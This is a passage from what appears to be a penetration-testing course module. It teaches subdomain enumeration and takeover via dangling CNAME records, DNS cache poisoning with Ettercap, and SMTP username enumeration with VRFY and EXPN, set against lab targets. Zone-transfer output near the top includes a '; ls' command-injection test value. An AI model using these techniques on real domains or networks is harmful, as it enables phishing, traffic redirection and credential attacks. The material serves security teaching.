               '@ <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NS</span> nsztm2.digi.ninja.',
 &lt;DNS name _acme-challenge&gt;: '_acme-challenge <span class="hljs-number">301</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> '
                             '"<span class="hljs-number">6</span>Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 &lt;DNS name _sip._tcp&gt;: '_sip._tcp <span class="hljs-number">14000</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">SRV</span> <span class="hljs-number">0 0 5060</span> www',
 &lt;DNS name <span class="hljs-number">14.105.196.5</span>.<span class="hljs-keyword">IN</span>-ADDR.ARPA&gt;: '<span class="hljs-number">14.105.196.5</span>.<span class="hljs-keyword">IN</span>-ADDR.ARPA <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">PTR</span> '
                                       'www',
 &lt;DNS name asfdbauthdns&gt;: 'asfdbauthdns <span class="hljs-number">7900</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">AFSDB</span> <span class="hljs-number">1</span> asfdbbox',
 &lt;DNS name asfdbbox&gt;: 'asfdbbox <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">127.0.0.1</span>',
 &lt;DNS name asfdbvolume&gt;: 'asfdbvolume <span class="hljs-number">7800</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">AFSDB</span> <span class="hljs-number">1</span> asfdbbox',
 &lt;DNS name canberra-office&gt;: 'canberra-office <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">202.14.81.230</span>',
 &lt;DNS name cmdexec&gt;: 'cmdexec <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> "<span class="hljs-comment">; ls"',</span>
 &lt;DNS name contact&gt;: 'contact <span class="hljs-number">2592000</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> "Remember to call or email Pippa '
                     'on +<span class="hljs-number">44</span> <span class="hljs-number">123 4567890</span> or pippa@zonetransfer.me when making '
                     'DNS changes"',
 &lt;DNS name dc-office&gt;: 'dc-office <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">143.228.181.132</span>',
 &lt;DNS name deadbeef&gt;: 'deadbeef <span class="hljs-number">7201</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">AAAA</span> dead:beaf::',
 &lt;DNS name dr&gt;: 'dr <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">LOC</span> <span class="hljs-number">53</span> <span class="hljs-number">20 56.558</span> N <span class="hljs-number">1</span> <span class="hljs-number">38 33.526</span> W <span class="hljs-number">0</span>.<span class="hljs-number">00m</span>',
 &lt;DNS name DZC&gt;: 'DZC <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> "AbCdEfG"',
 &lt;DNS name email&gt;: 'email <span class="hljs-number">2222</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NAPTR</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">74.125.206.26</span>',
 &lt;DNS name Hello&gt;: 'Hello <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> "Hi to Josh and all his class"',
 &lt;DNS name home&gt;: 'home <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">127.0.0.1</span>',
 &lt;DNS name Info&gt;: 'Info <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">TXT</span> "ZoneTransfer.me service provided by Robin '
                  'Wood - robin@digi.ninja. See '
                  'http://digi.ninja/projects/zonetransferme.php for more '
                  'information."',
 &lt;DNS name internal&gt;: 'internal <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NS</span> intns1\ninternal <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NS</span> intns2',
 &lt;DNS name intns1&gt;: 'intns1 <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">81.4.108.41</span>',
 &lt;DNS name intns2&gt;: 'intns2 <span class="hljs-number">300</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">167.88.42.94</span>',
 &lt;DNS name office&gt;: 'office <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">A</span> <span class="hljs-number">4.23.39.254</span>',
 &lt;DNS name ipv6actnow.org&gt;: 'ipv6actnow.org <span class="hljs-number">7200</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">AAAA</span> '
                            '<span class="hljs-number">2001:67c:2e8:11::c100:1332</span>',
...SNIP...
</code></pre>
<hr>
<h3 id="domain-takeovers-subdomain-enumeration">Domain Takeovers &amp; Subdomain Enumeration</h3>
<p><code>Domain takeover</code> is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.</p>
<p>Domain takeover is also possible with subdomains called <code>subdomain takeover</code>. A DNS&#39;s canonical name (<code>CNAME</code>) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. For example,</p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">sub</span><span class="hljs-selector-class">.target</span><span class="hljs-selector-class">.com</span>.   60   <span class="hljs-selector-tag">IN</span>   <span class="hljs-selector-tag">CNAME</span>   <span class="hljs-selector-tag">anotherdomain</span><span class="hljs-selector-class">.com</span>
</code></pre>
<p>The domain name (e.g., <code>sub.target.com</code>) uses a CNAME record to another domain (e.g., <code>anotherdomain.com</code>). Suppose the <code>anotherdomain.com</code> expires and is available for anyone to claim the domain since the <code>target.com</code>&#39;s DNS server has the <code>CNAME</code> record. In that case, anyone who registers <code>anotherdomain.com</code> will have complete control over <code>sub.target.com</code> until the DNS record is updated.</p>
<p><strong>Subdomain Enumeration</strong></p>
<p>Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like <a href="https://github.com/projectdiscovery/subfinder">Subfinder</a>. This tool can scrape subdomains from open sources like <a href="https://dnsdumpster.com/">DNSdumpster</a>. Other tools like <a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a> can also be used to brute-force subdomains by supplying a pre-generated wordlist:</p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]# ./subfinder -d inlanefreight.com -v       

        <span class="hljs-keyword">_</span>     __ <span class="hljs-keyword">_</span>         <span class="hljs-keyword">_</span>                                           
____  <span class="hljs-keyword">_</span>| <span class="hljs-type">|__</span> / <span class="hljs-keyword">_</span>(<span class="hljs-keyword">_</span>)<span class="hljs-keyword">_</span> <span class="hljs-keyword">_</span>  __| <span class="hljs-type">|___</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">_</span>          
(<span class="hljs-keyword">_</span>-&lt; |<span class="hljs-type">| | '_</span> \  <span class="hljs-keyword">_</span>| <span class="hljs-type">| ' \/ _</span>  / -<span class="hljs-keyword">_</span>) '<span class="hljs-keyword">_</span>|                 
<span class="hljs-type">/__</span>/\<span class="hljs-keyword">_</span>,<span class="hljs-keyword">_</span>|<span class="hljs-type">_</span>.__/<span class="hljs-keyword">_</span>| <span class="hljs-type">|_</span>|<span class="hljs-type">_</span>|<span class="hljs-type">|_</span>\__,<span class="hljs-keyword">_</span>\___|<span class="hljs-type">_</span>| <span class="hljs-type">v2</span><span class="hljs-number">.4</span><span class="hljs-number">.5</span>                                                                                                                                                                                                                                                 
                projectdiscovery.io                    

[WRN] Use <span class="hljs-built_in">with</span> caution. You are responsible <span class="hljs-keyword">for</span> your actions
[WRN] Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage.
[WRN] By <span class="hljs-built_in">using</span> subfinder, you also agree to the terms of the APIs used. 

[INF] Enumerating subdomains <span class="hljs-keyword">for</span> inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took <span class="hljs-number">2.193235338</span>s <span class="hljs-keyword">for</span> enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found <span class="hljs-number">4</span> subdomains <span class="hljs-keyword">for</span> inlanefreight.com <span class="hljs-built_in">in</span> <span class="hljs-number">20</span> seconds <span class="hljs-number">11</span> milliseconds
</code></pre>
<p>An excellent alternative is a tool called <a href="https://github.com/TheRook/subbrute">Subbrute</a>. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.</p>
<p><strong>Subbrute</strong></p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git clone https:<span class="hljs-comment">//github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1</span>
root@htb[/htb]$ cd subbrute
root@htb[/htb]$ echo <span class="hljs-string">"ns1.inlanefreight.com"</span> &gt; ./resolvers<span class="hljs-selector-class">.txt</span>
root@htb[/htb]$ ./subbrute inlanefreight<span class="hljs-selector-class">.com</span> -s ./names<span class="hljs-selector-class">.txt</span> -r ./resolvers<span class="hljs-selector-class">.txt</span>

Warning: Fewer than <span class="hljs-number">16</span> resolvers per process, consider adding more nameservers to resolvers<span class="hljs-selector-class">.txt</span>.
inlanefreight<span class="hljs-selector-class">.com</span>
ns2<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
www<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
ms1<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
support<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>

&lt;SNIP&gt;
</code></pre>
<p>Sometimes internal physical configurations are poorly secured, which we can exploit to upload our tools from a USB stick. Another scenario would be that we have reached an internal host through pivoting and want to work from there. Of course, there are other alternatives, but it does not hurt to know alternative ways and possibilities.</p>
<p>The tool has found four subdomains associated with <code>inlanefreight.com</code>. Using the <code>nslookup</code> or <code>host</code> command, we can enumerate the <code>CNAME</code> records for those subdomains.</p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]# host support.inlanefreight.<span class="hljs-keyword">com</span>

support.inlanefreight.<span class="hljs-keyword">com</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">an</span> alias <span class="hljs-keyword">for</span> inlanefreight.s3.amazonaws.<span class="hljs-keyword">com</span>
</code></pre>
<p>The <code>support</code> subdomain has an alias record pointing to an AWS S3 bucket. However, the URL <code>https://support.inlanefreight.com</code> shows a <code>NoSuchBucket</code> error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/s3.png" alt=""></p>
<p>The <a href="https://github.com/EdOverflow/can-i-take-over-xyz">can-i-take-over-xyz</a> repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.</p>
<hr>
<h3 id="dns-spoofing">DNS Spoofing</h3>
<p>DNS spoofing is also referred to as DNS Cache Poisoning. This attack involves altering legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website. Example attack paths for the DNS Cache Poisoning are as follows:</p>
<ul>
<li>An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (<code>MITM</code>) attack.</li>
<li>Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.</li>
</ul>
<p><strong>Local DNS Cache Poisoning</strong></p>
<p>From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like <a href="https://www.ettercap-project.org/">Ettercap</a> or <a href="https://www.bettercap.org/">Bettercap</a>.</p>
<p>To exploit the DNS cache poisoning via <code>Ettercap</code>, we should first edit the <code>/etc/ettercap/etter.dns</code> file to map the target domain name (e.g., <code>inlanefreight.com</code>) that they want to spoof and the attacker&#39;s IP address (e.g., <code>192.168.225.110</code>) that they want to redirect a user to:</p>
<p>Attacking DNS</p>
<pre><code class="lang-shell-session">root@htb[/htb]# cat /etc/ettercap/etter.dns

inlanefreight.com      A   <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>
*.inlanefreight.com    A   <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>
</code></pre>
<p>Next, start the <code>Ettercap</code> tool and scan for live hosts within the network by navigating to <code>Hosts &gt; Scan for Hosts</code>. Once completed, add the target IP address (e.g., <code>192.168.152.129</code>) to Target1 and add a default gateway IP (e.g., <code>192.168.152.2</code>) to Target2.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/target.png" alt=""></p>
<p>Activate <code>dns_spoof</code> attack by navigating to <code>Plugins &gt; Manage Plugins</code>. This sends the target machine with fake DNS responses that will resolve <code>inlanefreight.com</code> to IP address <code>192.168.225.110</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/etter\_plug.png" alt=""></p>
<p>After a successful DNS spoof attack, if a victim user coming from the target machine <code>192.168.152.129</code> visits the <code>inlanefreight.com</code> domain on a web browser, they will be redirected to a <code>Fake page</code> that is hosted on IP address <code>192.168.225.110</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/etter\_site.png" alt=""></p>
<p>In addition, a ping coming from the target IP address <code>192.168.152.129</code> to <code>inlanefreight.com</code> should be resolved to <code>192.168.225.110</code> as well:</p>
<pre><code class="lang-cmd-session">C:\&gt;ping inlanefreight.com

Pinging inlanefreight.com [<span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>] <span class="hljs-keyword">with</span> <span class="hljs-number">32</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> data:
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span>
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span>
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span>
Reply <span class="hljs-built_in">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>: <span class="hljs-keyword">bytes</span>=<span class="hljs-number">32</span> <span class="hljs-built_in">time</span>&lt;<span class="hljs-number">1</span>ms TTL=<span class="hljs-number">64</span>

Ping statistics <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.225</span><span class="hljs-number">.110</span>:
    Packets: Sent = <span class="hljs-number">4</span>, Received = <span class="hljs-number">4</span>, Lost = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),
Approximate <span class="hljs-built_in">round</span> trip times <span class="hljs-keyword">in</span> milli-<span class="hljs-built_in">seconds</span>:
    Minimum = <span class="hljs-number">0</span>ms, Maximum = <span class="hljs-number">0</span>ms, Average = <span class="hljs-number">0</span>ms
</code></pre>
<p>These are a few examples of common DNS attacks. There are other more advanced attacks that will be covered in later modules.</p>
<h2 id="latest-dns-vulnerabilities">Latest DNS Vulnerabilities</h2>
<hr>
<p>We can find thousands of subdomains and domains on the web. Often they point to no longer active third-party service providers such as AWS, GitHub, and others and, at best, display an error message as confirmation of a deactivated third-party service. Large companies and corporations are also affected time and again. Companies often cancel services from third-party providers but forget to delete the associated DNS records. This is because no additional costs are incurred for a DNS entry. Many well-known bug bounty platforms, such as <a href="https://www.hackerone.com/">HackerOne</a>, already explicitly list <code>Subdomain Takeover</code> as a bounty category. With a simple search, we can find several tools on GitHub, for example, that automate the discovery of vulnerable subdomains or help create Proof of Concepts (<code>PoC</code>) that can then be submitted to the bug bounty program of our choice or the affected company. RedHuntLabs did a <a href="https://redhuntlabs.com/blog/project-resonance-wave-1.html">study</a> on this in 2020, and they found that over 400,000 subdomains out of 220 million were vulnerable to subdomain takeover. 62% of them belonged to the e-commerce sector.</p>
<p><strong>RedHuntLabs Study</strong></p>
<p><img src="https://i0.wp.com/redhuntlabs.com/wp-content/uploads/2020/11/image-3.png" alt=""> Source: <a href="https://redhuntlabs.com/blog/project-resonance-wave-1.html">https://redhuntlabs.com/blog/project-resonance-wave-1.html</a></p>
<hr>
<h3 id="the-concept-of-the-attack">The Concept of the Attack</h3>
<p>One of the biggest dangers of a subdomain takeover is that a phishing campaign can be launched that is considered part of the official domain of the target company. For example, customers would look at the link and see that the domain <code>customer-drive.inlanefreight.com</code> (which points to a nonexisting S3 bucket from AWS) is behind the official domain <code>inlanefreight.com</code> and trust it as a customer. However, the customers do not know that this page has been mirrored or created by an attacker to provoke a login by the company&#39;s customers, for example.</p>
<p>Therefore, if an attacker finds a <code>CNAME</code> record in the company&#39;s DNS records that points to a subdomain that no longer exists and returns an <code>HTTP 404 error</code>, this subdomain can most likely be taken over by us through the use of the third-party provider. A subdomain takeover occurs when a subdomain points to another domain using the CNAME record that does not currently exist. When an attacker registers this nonexistent domain, the subdomain points to the domain registration by us. By making a single DNS change, we make ourselves the owner of that particular subdomain, and after that, we can manage the subdomain as we choose.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>What happens here is that the existing subdomain no longer points to a third-party provider and is therefore no longer occupied by this provider. Pretty much anyone can register this subdomain as their own. Visiting this subdomain and the presence of the CNAME record in the company&#39;s DNS leads, in most cases, to things working as expected. However, the design and function of this subdomain are in the hands of the attacker.</p>
<p><strong>Initiation of Subdomain Takeover</strong></p>
<table data-header-hidden><thead><tr><th></th><th width="278"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Subdomain Takeover</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>1.</code></td><td>The source, in this case, is the subdomain name that is no longer used by the company that we discovered.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>The registration of this subdomain on the third-party provider&#39;s site is done by registering and linking to own sources.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>Here, the privileges lie with the primary domain owner and its entries in its DNS servers. In most cases, the third-party provider is not responsible for whether this subdomain is accessible via others.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>The successful registration and linking are done on our server, which is the destination in this case.</td><td><code>Destination</code></td></tr></tbody></table>

<p>This is when the cycle starts all over again, but this time to trigger the forwarding to the server we control.</p>
<p><strong>Trigger the Forwarding</strong></p>
<table data-header-hidden><thead><tr><th width="103"></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Subdomain Takeover</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>The visitor of the subdomain enters the URL in his browser, and the outdated DNS record (CNAME) that has not been removed is used as the source.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>The DNS server looks in its list to see if it has knowledge about this subdomain and if so, the user is redirected to the corresponding subdomain (which is controlled by us).</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>The privileges for this already lie with the administrators who manage the domain, as only they are authorized to change the domain and its DNS servers. Since this subdomain is in the list, the DNS server considers the subdomain as trustworthy and forwards the visitor.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>The destination here is the person who requests the IP address of the subdomain where they want to be forwarded via the network.</td><td><code>Destination</code></td></tr></tbody></table>

<p>Subdomain takeover can be used not only for phishing but also for many other attacks. These include, for example, stealing cookies, cross-site request forgery (CSRF), abusing CORS, and defeating content security policy (CSP). We can see some examples of subdomain takeovers on the <a href="https://hackerone.com/hacktivity?querystring=%22subdomain%20takeover%22">HackerOne website</a>, which have earned the bug bounty hunters considerable payouts.</p>
<h2 id="attacking-email-services">Attacking Email Services</h2>
<hr>
<p>A <code>mail server</code> (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).</p>
<p>When we press the <code>Send</code> button in our email application (email client), the program establishes a connection to an <code>SMTP</code> server on the network or Internet. The name <code>SMTP</code> stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.</p>
<p>When we download emails to our email application, it will connect to a <code>POP3</code> or <code>IMAP4</code> server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.</p>
<p>By default, <code>POP3</code> clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a <code>POP3</code> client to keep copies of downloaded messages on the server.</p>
<p>On the other hand, by default, <code>IMAP4</code> clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let&#39;s see how we can target mail servers.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png" alt="text"></p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as <a href="https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook">Microsoft 365</a> or <a href="https://workspace.google.com/solutions/new-business/">G-Suite</a>. Therefore, our approach to attacking the email service depends on the service in use.</p>
<p>We can use the <code>Mail eXchanger</code> (<code>MX</code>) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.</p>
<p>We can use tools such as <code>host</code> or <code>dig</code> and online websites such as <a href="https://mxtoolbox.com/">MXToolbox</a> to query information about the MX records:</p>
<p><strong>Host - MX Records</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ host -t MX hackthebox<span class="hljs-selector-class">.eu</span>

hackthebox<span class="hljs-selector-class">.eu</span> mail is handled by <span class="hljs-number">1</span> aspmx<span class="hljs-selector-class">.l</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span>.
</code></pre>
<pre><code class="lang-shell-session">[!bash!]$ host -t MX microsoft<span class="hljs-selector-class">.com</span>

microsoft<span class="hljs-selector-class">.com</span> mail is handled by <span class="hljs-number">10</span> microsoft-com<span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.protection</span><span class="hljs-selector-class">.outlook</span><span class="hljs-selector-class">.com</span>.
</code></pre>
<p><strong>DIG - MX Records</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ <span class="hljs-keyword">dig</span> mx plaintext.<span class="hljs-keyword">do</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">"MX"</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">";"</span>

plaintext.<span class="hljs-keyword">do</span>.           <span class="hljs-number">7076</span>    IN      MX      <span class="hljs-number">50</span> mx3.zoho.<span class="hljs-keyword">com</span>.
plaintext.<span class="hljs-keyword">do</span>.           <span class="hljs-number">7076</span>    IN      MX      <span class="hljs-number">10</span> mx.zoho.<span class="hljs-keyword">com</span>.
plaintext.<span class="hljs-keyword">do</span>.           <span class="hljs-number">7076</span>    IN      MX      <span class="hljs-number">20</span> mx2.zoho.<span class="hljs-keyword">com</span>.
</code></pre>
<pre><code class="lang-shell-session">[!bash!]$ <span class="hljs-keyword">dig</span> mx inlanefreight.<span class="hljs-keyword">com</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">"MX"</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">";"</span>

inlanefreight.<span class="hljs-keyword">com</span>.      <span class="hljs-number">300</span>     IN      MX      <span class="hljs-number">10</span> mail1.inlanefreight.<span class="hljs-keyword">com</span>.
</code></pre>
<p><strong>Host - A Records</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ host -t A mail1<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.htb</span>.

mail1<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.htb</span> has <span class="hljs-selector-tag">address</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>
</code></pre>
<p>These <code>MX</code> records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.</p>
<p>This information is essential because the enumeration methods may differ from one service to another. For example, most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.</p>
<p>If we are targetting a custom mail server implementation such as <code>inlanefreight.htb</code>, we can enumerate the following ports:</p>
<table>
<thead>
<tr>
<th><strong>Port</strong></th>
<th><strong>Service</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TCP/25</code></td>
<td>SMTP Unencrypted</td>
</tr>
<tr>
<td><code>TCP/143</code></td>
<td>IMAP4 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/110</code></td>
<td>POP3 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/465</code></td>
<td>SMTP Encrypted</td>
</tr>
<tr>
<td><code>TCP/587</code></td>
<td>SMTP Encrypted/<a href="https://en.wikipedia.org/wiki/Opportunistic\_TLS">STARTTLS</a></td>
</tr>
<tr>
<td><code>TCP/993</code></td>
<td>IMAP4 Encrypted</td>
</tr>
<tr>
<td><code>TCP/995</code></td>
<td>POP3 Encrypted</td>
</tr>
</tbody>
</table>
<p>We can use <code>Nmap</code>&#39;s default script <code>-sC</code> option to enumerate those ports on the target system:</p>
<pre><code class="lang-shell-session">[!bash!]$ sudo <span class="hljs-keyword">nmap</span> -Pn -sV -sC -p25,<span class="hljs-number">143</span>,<span class="hljs-number">110</span>,<span class="hljs-number">465</span>,<span class="hljs-number">587</span>,<span class="hljs-number">993</span>,<span class="hljs-number">995</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>

Starting Nmap <span class="hljs-number">7.80</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">17</span>:<span class="hljs-number">56</span> CEST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00025</span>s latency).

PORT   STATE SERVICE VERSION
<span class="hljs-number">25</span>/tcp <span class="hljs-keyword">open</span>  smtp    Postfix smtpd
|_smtp-<span class="hljs-keyword">command</span><span class="hljs-variable">s:</span> mail1.inlanefreight.htb, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Addres<span class="hljs-variable">s:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)
</code></pre>
<hr>
<h3 id="misconfigurations">Misconfigurations</h3>
<p>Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.</p>
<p><strong>Authentication</strong></p>
<p>The SMTP server has different commands that can be used to enumerate valid usernames <code>VRFY</code>, <code>EXPN</code>, and <code>RCPT TO</code>. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let&#39;s explore how those commands work.</p>
<p><code>VRFY</code> this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.</p>
<p><strong>VRFY Command</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY<span class="hljs-built_in"> new-user
</span>
550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table
</code></pre>
<p><code>EXPN</code> is similar to <code>VRFY</code>, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the <code>VRFY</code> command since sites often have an alias such as &quot;all.&quot;</p>
<p><strong>EXPN Command</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ telnet <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span> <span class="hljs-number">25</span>

